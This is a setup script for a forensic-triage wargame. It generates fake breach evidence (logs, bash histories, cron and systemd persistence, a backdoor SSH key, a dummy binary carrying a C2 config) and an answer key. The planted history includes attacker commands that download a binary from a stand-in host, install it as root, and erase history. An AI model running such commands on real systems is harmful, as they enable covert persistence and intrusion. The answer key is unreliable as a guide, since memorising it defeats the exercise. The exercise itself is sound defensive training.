#!/bin/bash
# Wargame 27: forensic triage of a breached web server (captured files only).
SANDBOX="$1"
cd "$SANDBOX" || exit 1
rm -rf triage incident.json .lm
mkdir -p triage .lm
python3 - <<'PY'
import base64, os, random, json
from datetime import datetime, timedelta, timezone
rnd = random.Random(os.urandom(8))
T = "triage/"
def w(path, data, mtime=None, mode=0o644):
    p = T + path; os.makedirs(os.path.dirname(p), exist_ok=True)
    open(p, "wb" if isinstance(data, bytes) else "w").write(data)
    os.chmod(p, mode)
    if mtime: os.utime(p, (mtime, mtime))
tz = timezone(timedelta(hours=3, minutes=30))
t0 = datetime(2026, 11, 7, rnd.randint(17, 22), rnd.randint(0, 59), rnd.randint(0, 59), tzinfo=timezone.utc)
ip = "203.0.113.%d" % rnd.randint(20, 220)
exfil = "%s.%s" % (rnd.choice(["cdn-sync", "files-relay", "update-edge", "stor-pool"]), rnd.choice(["example-cdn.net", "mirrorhub.example", "svc-backup.example"]))
port = rnd.choice([443, 8443, 4444, 9001])
w("HOST.txt", "host: web-02\nserver time zone: UTC+03:30 (fixed, no DST). auth.log has no year (2026) and uses server local time.\n"
  "bash_history '#' lines are Unix epoch seconds (UTC).\ntriage collected: 2026-11-09 08:20 UTC\n"
  "stat.tsv columns: path, mtime (epoch), ctime (epoch), size. Paths are as on the host; triage/ is the host's /.\n"
  "known good sources: see known_ips.txt\n")
w("known_ips.txt", "10.0.5.0/24   office\n192.0.2.50     VPN (on-call engineers)\n")
# ---- auth.log
lines = []   # (utc datetime, text)
def sh(dt, msg, pid=None):
    lines.append((dt, msg, pid or rnd.randint(900, 32000)))
def legit(dt):
    u = rnd.choice(["deploy", "alice", "bob"]); src = "10.0.5.%d" % rnd.randint(10, 60)
    sh(dt, "Accepted publickey for %s from %s port %d ssh2: ED25519 SHA256:%s" % (u, src, rnd.randint(30000, 60000), base64.b64encode(os.urandom(32)).decode().rstrip("=")))
start = datetime(2026, 11, 5, 4, 0, tzinfo=timezone.utc)
for k in range(26):
    legit(start + timedelta(hours=k * 4 + rnd.randint(0, 3), minutes=rnd.randint(0, 59), seconds=rnd.randint(0, 59)))
# on-call VPN login at odd hour (legit decoy)
sh(datetime(2026, 11, 6, 23, 52, 11, tzinfo=timezone.utc), "Accepted publickey for alice from 192.0.2.50 port 40222 ssh2: ED25519 SHA256:%s" % base64.b64encode(os.urandom(32)).decode().rstrip("="))
# scanner noise, never succeeds
for k in range(60):
    dt = start + timedelta(minutes=rnd.randint(0, 3 * 24 * 60))
    sh(dt, "Failed password for invalid user %s from 198.51.100.23 port %d ssh2" % (rnd.choice(["admin", "oracle", "test", "ubuntu", "git"]), rnd.randint(30000, 60000)))
# attacker: failures then success
for k in range(6):
    sh(t0 - timedelta(seconds=40 - k * 6), "Failed password for deploy from %s port %d ssh2" % (ip, rnd.randint(30000, 60000)))
sh(t0, "Accepted password for deploy from %s port %d ssh2" % (ip, rnd.randint(30000, 60000)))
for k in range(3):
    sh(t0 + timedelta(hours=7 * (k + 1), minutes=rnd.randint(0, 40)), "Accepted publickey for deploy from %s port %d ssh2: ED25519 SHA256:%s" % (ip, rnd.randint(30000, 60000), base64.b64encode(os.urandom(32)).decode().rstrip("=")))
lines.sort(key=lambda x: x[0])
out = []
for dt, msg, pid in lines:
    l = dt.astimezone(tz)
    out.append("%s %2d %s web-02 sshd[%d]: %s" % (l.strftime("%b"), l.day, l.strftime("%H:%M:%S"), pid, msg))
w("var/log/auth.log", "\n".join(out) + "\n")
# ---- histories
e0 = int(t0.timestamp())
def hist(entries):
    return "".join("#%d\n%s\n" % (t, c) for t, c in entries)
alice = [(e0 - 400000 + i * 3000, c) for i, c in enumerate(["ls -la", "cd /srv/app && git pull", "systemctl status app", "tail -n 50 /var/log/app/app.log", "exit"])]
w("home/alice/.bash_history", hist(alice))
dep_old = [(e0 - 200000 + i * 1700, c) for i, c in enumerate(["cd /srv/app", "./deploy.sh staging", "docker ps", "sudo systemctl restart app", "logout"])]
att = [(e0 + 37, "id; uname -a"), (e0 + 61, "cd /tmp"), (e0 + 90, "curl -s -o .sysd http://%s/x" % ip), (e0 + 118, "chmod +x .sysd && sudo mv .sysd /usr/local/bin/sysupd"),
       (e0 + 190, "echo '*/10 * * * * root /usr/local/bin/sysupd -q' | sudo tee /etc/cron.d/sysupd"),
       (e0 + 260, "sudo systemctl enable --now sysupd"), (e0 + 330, "echo 'ssh-ed25519 AAAA... ops@backup' >> ~/.ssh/authorized_keys"), (e0 + 400, "history -c")]
w("home/deploy/.bash_history", hist(dep_old + att))
# ---- persistence files and legit ones
cr = e0 + 190; sd = e0 + 260; ak = e0 + 330
w("etc/cron.d/sysupd", "*/10 * * * * root /usr/local/bin/sysupd -q\n", cr)
w("etc/cron.d/cacheprune", "30 3 * * * root /usr/local/bin/cacheprune\n", e0 - 86400 * 200)
w("etc/systemd/system/sysupd.service", "[Unit]\nDescription=System update helper\n\n[Service]\nExecStart=/usr/local/bin/sysupd -q\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n", sd)
os.makedirs(T + "etc/systemd/system/multi-user.target.wants", exist_ok=True)
os.symlink("../sysupd.service", T + "etc/systemd/system/multi-user.target.wants/sysupd.service")
w("etc/systemd/system/app.service", "[Unit]\nDescription=App\n\n[Service]\nExecStart=/srv/app/run\n\n[Install]\nWantedBy=multi-user.target\n", e0 - 86400 * 90)
w("etc/systemd/system/cacheprune.service", "[Unit]\nDescription=Cache prune\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/cacheprune\n", e0 - 86400 * 200)
w("home/deploy/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOfficeKeyDeploy000000000000000000000000000 deploy@office\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBackdoorKey1111111111111111111111111 ops@backup\n", ak, 0o600)
w("home/deploy/.bashrc", "# ~/.bashrc\nalias ll='ls -l'\n", e0 - 86400 * 300)
# ---- binaries
blob = base64.b64encode(("c2=%s:%d;token=%s;interval=600" % (exfil, port, base64.b16encode(os.urandom(6)).decode().lower())).encode()).decode()
decoy = base64.b64encode(b"build-7f3a91 release 2.4 gcc 13.2").decode()
elf = b"\x7fELF\x02\x01\x01" + os.urandom(900) + b"\x00cfg=" + blob.encode() + b"\x00" + os.urandom(500) + b"\x00build=" + decoy.encode() + b"\x00" + os.urandom(700)
old = int(datetime(2024, 3, 2, 10, 0, tzinfo=timezone.utc).timestamp())
w("usr/local/bin/sysupd", elf, old, 0o755)
w("usr/local/bin/cacheprune", "#!/bin/sh\nfind /var/cache/app -mtime +7 -delete\n", int(datetime(2026, 4, 14, tzinfo=timezone.utc).timestamp()), 0o755)
w("usr/local/bin/backup.sh", "#!/bin/sh\nrsync -a /srv/app/data /backup/\n", int(datetime(2026, 1, 9, tzinfo=timezone.utc).timestamp()), 0o755)
w("tmp/build-cache.tar", os.urandom(4000), e0 + 5000)
w("var/lib/dpkg/info/python3.12.list", "/usr/bin/python3.12\n/usr/lib/python3.12\n/usr/lib/python3.12/os.py\n")
w("var/lib/dpkg/info/coreutils.list", "/bin/ls\n/usr/bin/sort\n/usr/bin/curl\n")
w("var/lib/dpkg/info/openssh-server.list", "/usr/sbin/sshd\n/etc/ssh/sshd_config\n")
w("var/log/apt/history.log", "Start-Date: %s\nCommandline: apt-get upgrade -y\nUpgrade: python3.12:amd64 (3.12.3-1ubuntu0.2, 3.12.3-1ubuntu0.3)\nEnd-Date: %s\n" % ((t0 + timedelta(hours=9)).strftime("%Y-%m-%d  %H:%M:%S"), (t0 + timedelta(hours=9, minutes=2)).strftime("%Y-%m-%d  %H:%M:%S")))
# ---- stat.tsv (captured; ctime tells the truth)
rows = []
def st(path, mt, ct, size): rows.append("%s\t%d\t%d\t%d" % (path, mt, ct, size))
st("/usr/local/bin/sysupd", old, e0 + 118, len(elf))
st("/usr/local/bin/cacheprune", int(datetime(2026, 4, 14, tzinfo=timezone.utc).timestamp()), int(datetime(2026, 4, 14, tzinfo=timezone.utc).timestamp()), 60)
st("/usr/local/bin/backup.sh", int(datetime(2026, 1, 9, tzinfo=timezone.utc).timestamp()), int(datetime(2026, 1, 9, tzinfo=timezone.utc).timestamp()), 45)
pt = int((t0 + timedelta(hours=9)).timestamp())
st("/usr/bin/python3.12", int(datetime(2025, 12, 1, tzinfo=timezone.utc).timestamp()), pt + 60, 7800000)
st("/usr/lib/python3.12/os.py", int(datetime(2025, 12, 1, tzinfo=timezone.utc).timestamp()), pt + 61, 39000)
st("/tmp/build-cache.tar", e0 + 5000, e0 + 5000, 4000)
st("/etc/cron.d/sysupd", cr, cr, 52); st("/etc/cron.d/cacheprune", e0 - 86400 * 200, e0 - 86400 * 200, 48)
st("/etc/systemd/system/sysupd.service", sd, sd, 160); st("/etc/systemd/system/multi-user.target.wants/sysupd.service", sd, sd, 25)
st("/etc/systemd/system/app.service", e0 - 86400 * 90, e0 - 86400 * 90, 120)
st("/home/deploy/.ssh/authorized_keys", ak, ak, 230); st("/home/deploy/.bashrc", e0 - 86400 * 300, e0 - 86400 * 300, 40)
rnd.shuffle(rows)
w("stat.tsv", "\n".join(rows) + "\n")
exp = {"first_malicious_login": {"time_utc": t0.strftime("%Y-%m-%dT%H:%M:%SZ"), "ip": ip},
       "persistence": sorted(["/etc/cron.d/sysupd", "/etc/systemd/system/sysupd.service", "/home/deploy/.ssh/authorized_keys"]),
       "exfil_host": exfil, "dropped_binary": "/usr/local/bin/sysupd"}
json.dump(exp, open(".lm/expected.json", "w"))
PY
exit 0
